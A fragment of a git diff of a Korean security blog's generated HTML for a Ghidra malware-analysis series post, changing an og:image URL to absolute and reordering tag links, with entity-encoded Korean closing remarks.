&amp;#xC6B0;&amp;#xC120;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (&amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xB2A5;&amp;#xC774; &amp;#xB611;&amp;#xAC19;&amp;#xC544;&amp;#xC11C; &amp;#xC5B4;&amp;#xCA54; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4;&amp;#xC694;.) Malware analysis &amp;#xD30C;&amp;#xD2B8;&amp;#xB97C; 1&amp;#xB85C; &amp;#xB05D;&amp;#xB0C8;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xC558;&amp;#xC744; &amp;#xD150;&amp;#xB370;&amp;#x2026;&lt;/p&gt;
 &lt;p&gt;&amp;#xC544;&amp;#xBB34;&amp;#xD2BC;! &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC624;&amp;#xB7AB;&amp;#xB3D9;&amp;#xC548; &amp;#xAE00;&amp;#xC744; &amp;#xC791;&amp;#xC131;&amp;#xD588;&amp;#xB124;&amp;#xC694;. &amp;#xB3C4;&amp;#xC6C0;&amp;#xC774; &amp;#xB418;&amp;#xC168;&amp;#xC73C;&amp;#xBA74; &amp;#xC88B;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#xB9CC;&amp;#x2026; &amp;#xC800;&amp;#xB294; &amp;#xBBF8;&amp;#xAC1C;&amp;#xD55C; &amp;#xC2E4;&amp;#xB825;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xC0AC;&amp;#xB78C;&amp;#xC774;&amp;#xB77C;&amp;#xC11C;&amp;#x2026; &amp;#x3160;&amp;#x3160;&amp;#x2026; ghidra &amp;#xD30C;&amp;#xD2B8;&amp;#xB294; &amp;#xB354; &amp;#xB2E4;&amp;#xB8F0; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC5C6;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC544; &amp;#xC774;&amp;#xC81C; &amp;#xC885;&amp;#xB8CC;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xB2E4;&amp;#xB2E4;&amp;#xC74C;&amp;#xC8FC;&amp;#xC5D0; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xBD84;&amp;#xC11D; VM &amp;#xC790;&amp;#xB3D9;&amp;#xD654;&amp;#xC758; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xD30C;&amp;#xD2B8;&amp;#xB3C4; &amp;#xC5C5;&amp;#xB85C;&amp;#xB4DC;&amp;#xB418;&amp;#xB2C8; &amp;#xAE30;&amp;#xB2E4;&amp;#xB824; &amp;#xC8FC;&amp;#xC138;&amp;#xC6A9;~ &amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xB9CC;!&lt;/p&gt;
  - hack &amp; life">
-  <meta property="og:image" content="/2021/07/11/idioth/ghidra_part5/thumbnail.jpg">
+  <meta property="og:image" content="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/thumbnail.jpg">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">
@@ -1173,9 +1631,9 @@ WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/malware/">malware</a>
-                  
                   <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
+                  
+                  <a class="hover-with-bg" href="/tags/malware/">malware</a>
                   
                   <a class="hover-with-bg" href="/tags/reversing/">reversing</a>
                   
